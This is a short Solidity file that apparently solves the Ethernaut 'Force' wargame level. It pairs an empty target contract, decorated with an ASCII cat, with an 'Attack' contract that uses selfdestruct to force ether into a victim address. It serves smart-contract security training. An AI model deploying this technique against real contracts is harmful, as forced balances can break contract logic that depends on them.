// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
		/*
       MEOW ?
         /\_/\
        / o o \
       (   "   )
        \~(*)~/
         // \\
    */
}

contract Attack {
    receive() external payable {}

    function attack(address payable _victim) public {
        selfdestruct(_victim);
    }

}
